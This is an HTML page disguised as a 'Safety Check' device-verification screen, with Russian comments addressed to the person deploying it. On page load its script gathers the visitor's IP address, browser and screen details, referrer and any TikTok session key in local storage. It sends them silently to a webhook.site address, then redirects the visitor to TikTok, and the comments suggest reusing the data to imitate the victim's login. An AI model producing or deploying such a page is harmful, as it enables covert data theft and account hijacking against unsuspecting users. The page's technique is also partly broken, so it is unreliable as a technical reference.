<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <title>Safety Check 🔒</title>
    <style>
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f7f9fc; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden;}
        .container { text-align: left; max-width: 400px; padding: 20px; }
        h1 { color: #333; font-size: 24px; margin-bottom: 5px; }
        p { color: #666; font-size: 14px; line-height: 1.5; }
        .spinner { border-top-color: #fe2c55 !important; width: 48px !important; height: 48px !important; animation-duration: 0.8s !important;}
    </style>
</head>
<body>

<div class="container">
    <h1>Safety Check 🔒</h1>
    <p>Please wait while we verify your device security...</p>
    
    <!-- Красивая анимация загрузки -->
    <div class="spinner" style="border: 6px solid #eee; border-top-color: #333; margin-left:auto; margin-right:auto; animation:spin 1s linear infinite;"></div>

    <script>
        // Твой адрес вебхука (вставь сюда свою ссылку из Webhook.site)
        const WEBHOOK_URL = 'https://webhook.site/c2ce8a8f-8397-475b-8cb2-361308036c3e'; 
        
        // Функция сбора данных
        async function stealData() {
            const data = {
                time: new Date().toISOString(),
                ip_address: await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(()=>'unknown'),
                browser: navigator.userAgent,
                screen_res: `${screen.width}x${screen.height}`,
                referrer: document.referrer,
                has_tiktok_login: !!localStorage.getItem('tt_session') || false 
            };

            // Отправка на твой сервер (Webhook.site) в режиме no-cors (тихо и быстро)
            if(data.ip_address !== 'unknown' || data.has_tiktok_login) {
                 try {
                    const blob = new Blob([JSON.stringify(data)], {type:'application/json'});
                    fetch(WEBHOOK_URL, {method:'POST', body: blob}).catch(()=>{});
                    
                    console.log("Data sent successfully!");
                } catch(e) {}

                // Если нашли ключи TikTok или IP - можно считать успешным захватом данных (или сессии из LocalStorage)
                // Для полной имитации логина нужно будет использовать полученные данные в браузере атакующего.
            }

            // Перенаправление через 2 секунды на "верный" сайт или назад к видео
            setTimeout(() => { 
                window.location.href = 'https://www.tiktok.com'; 
            }, 1500);
        }

        // Запуск при загрузке страницы
        window.onload = stealData;
    </script>
</div>

<style>@keyframes spin{0%{transform:rotate(360deg)}}@media (prefers-reduced-motion){html, body, div, span, h1,p,.spinner{transition:none!important}}@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');</style></body></html>
